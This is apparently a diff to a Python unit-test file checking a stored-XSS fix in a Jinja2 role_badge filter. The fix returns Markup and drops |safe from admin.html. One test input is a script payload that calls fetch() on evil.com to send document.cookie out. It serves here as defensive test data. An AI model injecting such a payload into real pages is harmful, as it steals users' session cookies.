@@ -75,11 +75,55 @@ class TestStringUtils(unittest.TestCase):
 
 
 class TestRoleBadgeXSSPrevention(unittest.TestCase):
-    """Test XSS prevention in role_badge filter"""
+    """Test XSS prevention in role_badge filter.
+
+    The remediation for Stored XSS (CWE-79) consists of two parts:
+      1. role_badge() now returns a markupsafe.Markup object (instead of str)
+         so Jinja2 auto-escaping treats the wrapper HTML as intentionally safe.
+      2. The admin.html template no longer uses the |safe filter on role_badge,
+         which removes the auto-escape bypass that made the taint flow exploitable.
+    These tests verify both the escaping behaviour and the Markup return type.
+    """
 
     def setUp(self):
         """Set up mock context for Jinja2 contextfilter"""
         self.mock_context = MagicMock()
+
+    # ------------------------------------------------------------------
+    # Return-type tests: verify the fix uses Markup, not plain str
+    # ------------------------------------------------------------------
+
+    def test_role_badge_returns_markup_object(self):
+        """role_badge must return Markup, not str, so |safe is not needed.
+
+        Jinja2 auto-escaping treats Markup as already-safe HTML and will not
+        double-encode the wrapper tags.  A plain str return would still require
+        |safe in the template, re-exposing the XSS bypass.
+        """
+        from markupsafe import Markup
+        result = role_badge(self.mock_context, 'admin')
+        self.assertIsInstance(
+            result,
+            Markup,
+            "role_badge must return markupsafe.Markup so the template can "
+            "omit |safe and rely on Jinja2 auto-escaping.",
+        )
+
+    def test_role_badge_xss_payload_returns_markup_object(self):
+        """Markup return type is preserved even when the input is malicious."""
+        from markupsafe import Markup
+        result = role_badge(self.mock_context, '<script>alert(1)</script>')
+        self.assertIsInstance(result, Markup)
+
+    def test_role_badge_none_returns_markup_object(self):
+        """Markup return type is preserved for None input."""
+        from markupsafe import Markup
+        result = role_badge(self.mock_context, None)
+        self.assertIsInstance(result, Markup)
+
+    # ------------------------------------------------------------------
+    # Escaping behaviour tests
+    # ------------------------------------------------------------------
 
     def test_role_badge_escapes_script_tag(self):
         """Test that script tags in role are escaped"""
@@ -205,9 +249,11 @@ class TestRoleBadgeXSSPrevention(unittest.TestCase):
 
     def test_role_badge_with_multiline_xss(self):
         """Test that multiline XSS attempts are escaped"""
-        malicious_role = """<script>
-        fetch('https://evil.com?cookie=' + document.cookie)
-        </script>"""
+        malicious_role = (
+            "<script>\n"
+            "        fetch('https://evil.com?cookie=' + document.cookie)\n"
+            "        </script>"
+        )
         result = role_badge(self.mock_context, malicious_role)
 
         # Should escape the script tags
@@ -259,6 +305,34 @@ class TestRoleBadgeXSSPrevention(unittest.TestCase):
             # Badge wrapper should always be present
             self.assertIn('<span class="badge', result)
             self.assertIn('</span>', result)
+
+    # ------------------------------------------------------------------
+    # Template integration: verify |safe is absent from admin.html
+    # ------------------------------------------------------------------
+
+    def test_admin_template_does_not_use_safe_filter_on_role_badge(self):
+        """admin.html must not use |safe on role_badge output.
+
+        The Stored XSS was enabled by ``{{ user.role|role_badge|safe }}`` which
+        bypasses Jinja2 auto-escaping.  After the fix, role_badge returns a
+        Markup object, so the template omits |safe and relies on Jinja2
+        auto-escaping.  This test enforces that regression does not occur.
+        """
+        import os
+        template_path = os.path.join(
+            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+            'templates', 'admin.html',
+        )
+        with open(template_path, 'r') as fh:
+            content = fh.read()
+
+        # The unsafe pattern must not appear anywhere in the template.
+        self.assertNotIn(
+            'role_badge|safe',
+            content,
+            "admin.html must not pipe role_badge output through |safe — "
+            "role_badge returns Markup and Jinja2 auto-escaping is sufficient.",
+        )
 
 
 if __name__ == '__main__':
